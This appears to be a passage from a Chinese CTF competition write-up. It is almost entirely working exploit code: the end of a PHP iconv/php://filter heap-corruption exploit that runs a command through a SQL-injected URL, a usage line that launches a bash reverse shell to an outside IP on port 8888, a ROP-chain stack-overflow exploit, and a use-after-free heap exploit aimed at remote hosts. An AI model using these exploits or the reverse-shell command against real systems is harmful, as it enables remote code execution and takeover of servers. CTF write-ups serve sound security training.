ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = self.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> self.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br><br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * self.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = self.build_exploit_path()<br>        start = time.time()<br>        path = <span class="hljs-string">f&quot;http://localhsot/&#x27; union select &#x27;<span class="hljs-subst">&#123;path&#125;</span>&#x27;#&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            self.remote.send(path)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + self.sleep &lt;= time.time():<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> self.stop - self.start<br><br><br>Exploit()<br><br></code></pre></td></tr></table></figure><p>用法与原来一样</p><p><code>python3 exp.py http://x.x.x.x:10034/url.php &#39;bash -c &quot;bash -i&gt;&amp;/dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;&#39;</code></p><p><img src="/img/wp/2024/2024-ycb-c-%E7%BD%91%E7%BB%9C%E7%85%A7%E7%9B%B8%E9%A6%86-1.png"></p><h1 id="初赛-pwn"><a href="#初赛-pwn" class="headerlink" title="[初赛] pwn"></a>[初赛] pwn</h1><h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>pop_rdi=<span class="hljs-number">0x0000000000400773</span><br>leave=<span class="hljs-number">0x4006DB</span><br>ret=<span class="hljs-number">0x4006DC</span><br>read=<span class="hljs-number">0x4006C4</span><br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#gdb.attach(p,f&#x27;bp &#123;leave&#125;&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;139.155.126.78&quot;</span>,<span class="hljs-string">&quot;39592&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc&quot;)</span><br>fun_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>bss=e.bss(<span class="hljs-number">0x800</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendafter(<span class="hljs-string">&quot;rflow?\n&quot;</span>,payload)<br>p.send(p64(bss+<span class="hljs-number">0x50</span>)+p64(pop_rdi)+p64(fun_got)+p64(puts)+p64(read)+p64(<span class="hljs-number">0</span>)+p64(bss-<span class="hljs-number">0x30</span>)+p64(leave))<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload=p64(bss)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(read)+p64(bss+<span class="hljs-number">0x50</span>-<span class="hljs-number">0x30</span>)+p64(leave)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h2><p>uaf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>city=[<span class="hljs-string">b&quot;guangzhou&quot;</span>,<span class="hljs-string">b&quot;nanning&quot;</span>,<span class="hljs-string">b&quot;changsha&quot;</span>,<span class="hljs-string">b&quot;nanchang&quot;</span>,<span class="hljs-string">b&quot;fuzhou&quot;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">tool,form,to,data=<span class="hljs-string">b&#x27;\n&#x27;</span>,far=<span class="hljs-number">999</span></span>):<br>    tools=[<span class="hljs-string">b&#x27;car&#x27;</span>,<span class="hljs-string">b&#x27;train&#x27;</span>,<span class="hljs-string">b&#x27;plane&#x27;</span>]<br><br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;plane?&#x27;</span>,tools[tool])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;far?&#x27;</span>,<span class="hljs-built_in">str</span>(far).encode());<br>    p.sendafter(<span class="hljs-string">b&#x27;Note:&#x27;</span>,data)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">form,to</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">form,to</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">form,to,ind,data,far=<span class="hljs-number">3000</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;far?&#x27;</span>,<span class="hljs-built_in">str</span>(far).encode());<br>    p.sendafter(<span class="hljs-string">b&#x27;Note:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">distan</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;travel&#x27;</span>,city[<span class="hljs-number">3</span>])<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;139.155.126.78&quot;</span>,<span class="hljs-string">&quot;39558&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;b _IO_obstack_xsputn\nc&#x27;)</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,far=<span class="hljs-number">999</span>,data=<span class="hljs-string">b&quot;1324&quot;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,far=<span class="hljs-number">999</span>,data=<span class="hljs-string">b&quot;321&quot;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,far=<span class="hljs-number">999</span>,data=<span class="hljs-string">b&quot;132&quot;</span>) <span class="hljs-comment">#2</span><br>distan()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-string">b&quot;adsf&quot;</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#pause()</span><br>free(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#free(0,0)</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#4+0x10</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#5+0x20</span><br>free(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Note:&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ace0</span><br>success(<span class="hljs-string">f&quot;libc.address: 0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br>IO_list_all=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>xxx=libc.address+<span class="hljs-number">0x21b660</span><br>success(<span class="hljs-string">f&quot;IO_list_all: 0x<span class="hljs-subst">&#123;IO_list_all:x&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Note:&#x27;</span>)<br>chunk_1=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;chunk_1: 0x<span class="hljs-subst">&#123;chunk_1:x&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Note:&#x27;</span>)<br>large_bin=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;large bin: 0x<span class="hljs-subst">&#123;large_bin:x&#125;</span>&quot;</span>)<br>pause()<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p64(large_bin)*<span class="hljs-number">2</span>+p64(IO_list_all-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>,far=<span class="hljs-number">0x531</span>)<br>pause()<br><br>chunk_0=chunk_1-<span class="hljs-number">0x520</span><br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect=libc.sym[<span 